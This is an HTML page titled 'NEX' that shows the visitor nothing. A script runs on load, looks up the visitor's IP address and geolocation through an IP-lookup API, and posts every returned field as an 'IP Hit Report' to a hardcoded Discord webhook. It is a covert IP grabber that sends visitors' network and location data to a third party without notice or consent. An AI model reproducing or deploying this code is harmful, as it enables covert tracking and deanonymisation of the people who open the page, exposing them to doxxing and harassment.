<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NEX</title>
</head>
<body>
    <script>
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                
                const embedData = {
                    title: "IP Hit Report",
                    description: `IP Address: ${ip}`,
                    fields: []
                };

                Object.entries(data).forEach(([key, value]) => {
                    if (key !== 'ip' && key !== 'version') {  
                        const label = `${key.replace(/_/g, ' ')}`.replace(/^./, (s) => s.charAt(0).toUpperCase() + s.substr(1));
                        embedData.fields.push({
                            name: label,
                            value: value || "N/A",
                            inline: true  
                        });
                    }
                });

                fetch("https://discord.com/api/webhooks/1418503063647293511/AHPEOUs6_GQtIB4hjxkYjHZ6qMz39ZkTlOpOUFobwY6Y56jkgnMiEGEZKEpAJ3o084-n",
                    {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            embeds: [embedData]
                        })
                    })
                    .then(() => console.log("Embed sent successfully!"))
                    .catch(error => console.error("Error:", error));
            });
    </script>
</body>
</html>
